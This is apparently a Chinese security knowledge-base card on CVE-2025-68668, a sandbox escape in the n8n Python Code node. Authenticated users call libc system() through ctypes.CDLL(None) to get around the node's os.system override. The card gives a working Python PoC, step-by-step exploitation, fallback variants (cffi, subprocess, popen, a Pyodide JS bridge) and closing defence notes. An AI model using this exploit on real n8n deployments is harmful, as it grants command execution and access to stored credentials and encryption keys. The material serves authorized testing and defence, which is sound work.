---
id: web-nodejs-n8n-python-ctypes-cdll-system-sandbox-bypass
title: n8n Python Code 节点仅封 os.system：ctypes.CDLL(None).system 直接调用 libc 绕过（CVE-2025-68668 另一路径）
type: scenario
domain: web
path: web/nodejs
technique: n8n-python-ctypes-cdll-system-bypass
tags:
- n8n
- nodejs
- python
- ctypes
- libc
- sandbox-escape
- disable-functions-bypass
- rce
- cve-2025-68668
- authenticated
cve:
- CVE-2025-68668
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: n8n 1.0.0 至 < 2.0.0
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:50:14+08:00'
  notes: 已对照原文与图07/08核对：ctypes.CDLL(None).system 写入 /tmp/n8n_poc.txt 返回 SUCCESS，docker exec cat 输出 CVE-2025-68668_1.116.0 与原文一致。卡片正确标注该路径依赖原生 Python runner（文章结果证明其非纯 Pyodide MEMFS），并注明纯 Pyodide 下 ctypes 不可触达宿主 libc，confidence medium 与证据等级匹配。affected_versions n8n 1.0.0 至 <2.0.0 与通告一致并已 set-versions。无 sources/source_url。未在本机复跑。
url: /docs/web/nodejs/web-nodejs-n8n-python-ctypes-cdll-system-sandbox-bypass/
draft: false
kb_aliases:
- CVE-2025-68668 ctypes
- n8n ctypes 沙箱绕过
- CDLL(None).system
- os.system 覆盖绕过
- n8n Python Code Node 命令执行
---

## 一句话结论

n8n 1.0.0 至 2.0.0 之前的 Python Code 节点在初始化沙箱时只把 `os.system` 替换为 `blocked_function`，没有限制 `ctypes`；攻击者用 `ctypes.CDLL(None).system(b'cmd')` 直接调用宿主 libc 的 `system()`，绕过 Python 层的 `os.system` 覆盖执行命令（CVE-2025-68668 的另一条利用路径）。

## 原理

- **防护不完整**：Pyodide 初始化脚本只做了三件事：覆盖 `os.system`、阻断 `Object.constructor.constructor`、替换 `sys.modules['js']`；`ctypes` 模块未被禁用或代理。
- **ctypes 是 FFI**：`ctypes.CDLL(None)` 打开当前进程的主程序/已加载 libc 的符号表，`libc.system` 直接解析到 C 层 `system()`，不经过 Python 的 `os.system` 包装；因此 Python 层对 `os.system` 的替换对它无效。
- **原生运行环境**：该路径在文章环境中（n8n 1.116.0）成功执行 `echo ... > /tmp/n8n_poc.txt`，并通过 `docker exec n8n cat /tmp/n8n_poc.txt` 在宿主文件系统看到结果。这说明该 Code 节点实际运行在原生 Python 进程（task runner），而不是纯 Pyodide 的 Emscripten 虚拟文件系统；在纯 Pyodide 中 `ctypes` 通常无法直接触达宿主 libc。
- **危害**：命令以 Python 运行器进程用户身份执行；若运行器与 n8n 主进程同容器/同用户，可读取 `N8N_ENCRYPTION_KEY`、数据库、凭据并进一步横向。
- **为什么容易漏**：沙箱作者关注了 `os.system`、JS 构造器与 `js` 模块，但 Python 的进程/命令执行面很广（`ctypes`、`cffi`、`posix`、`subprocess`、`os.popen` 等）；只封一个函数不能构成沙箱。

## 触发条件

- n8n 版本 `>=1.0.0, <2.0.0`，Python Code 节点可用。
- 攻击者拥有可创建/编辑并执行工作流的账号（已认证）。
- Code 节点运行在原生 Python 运行器（非纯 Pyodide/WASM）环境，或 `ctypes` 被映射到宿主 libc。
- 运行器进程有执行命令所需的权限，且未用 seccomp/容器策略阻断 `execve`。
- `ctypes` 未被禁用，且 `CDLL(None)` 能解析到 `system` 符号。

## 利用步骤

1. 登录 n8n，创建含 Python Code 节点的工作流。
2. 在 Code 节点中 `import ctypes`，用 `ctypes.CDLL(None)` 获取主程序符号表。
3. 声明 `libc.system.argtypes = [ctypes.c_char_p]`、`restype = ctypes.c_int`，调用 `libc.system(b'id > /tmp/n8n_poc.txt')`。
4. 执行工作流；通过容器内 `cat /tmp/n8n_poc.txt` 或后续节点读取结果验证。
5. 授权测试只写标记文件或执行 `id`，不读取真实用户数据。
6. 若 `CDLL(None)` 失败，尝试 `ctypes.CDLL("libc.so.6")`、`ctypes.util.find_library("c")` 或其它 FFI 路径。

## PoC

```python
import ctypes

libc = ctypes.CDLL(None)
libc.system.argtypes = [ctypes.c_char_p]
libc.system.restype = ctypes.c_int

result = libc.system(b'echo "CVE-2025-68668_1.116.0" > /tmp/n8n_poc.txt')
return {"status": "SUCCESS", "result": result}
```

原文在 n8n 1.116.0 环境执行后，`docker exec n8n cat /tmp/n8n_poc.txt` 输出 `CVE-2025-68668_1.116.0`（图 07、08）。

## 变体与关联

- 变体：`ctypes.CDLL("libc.so.6")`、`ctypes.CFUNCTYPE` 调用 `execve`/`popen`，或通过 `ctypes` 修改 Python 对象内存。
- 变体：若 `ctypes` 被禁，尝试 `cffi`、`posix`、`subprocess`、`os.popen`、`multiprocessing` 等未被覆盖的进程执行面。
- 变体：在纯 Pyodide 环境中 ctypes 不可用，可改用 `js.XMLHttpRequest.constructor` 宿主 Function 路径。
- 关联：[[web-nodejs-n8n-pyodide-xmlhttprequest-constructor-host-function-escape]]（同 CVE 的 Pyodide JS 桥接路径）、[[web-nodejs-n8n-python-task-runner-eobj-sandbox-escape-rce]]（CVE-2026-0863 AST 黑名单绕过）、[[web-php-rce-disable-functions-ld-preload]]（同类“只禁一个函数”绕过思路）。

## 检测与防御

- 升级 n8n 到 2.0.0 或更高；确认 Python 运行器不再把 `ctypes` 暴露给用户代码。
- 沙箱加固：在独立低权限容器中运行 Code 节点，使用 seccomp/AppArmor 阻断 `execve`、限制可读文件与网络；禁用 `ctypes`/`cffi`/`subprocess` 等 FFI/进程模块。
- 检测：审计 Code 节点中的 `ctypes`、`CDLL`、`libc`、`system`、`execve`、`subprocess` 等字符串；监控运行器进程的异常子进程与 `/tmp` 落地文件。
- 响应：隔离运行器，轮换 n8n 加密密钥、数据库与外部凭据，审计工作流与执行日志。
- 说明：该路径依赖原生 Python 运行环境；纯 Pyodide/WASM 下 `ctypes` 不触达宿主 libc，需以实际部署验证。
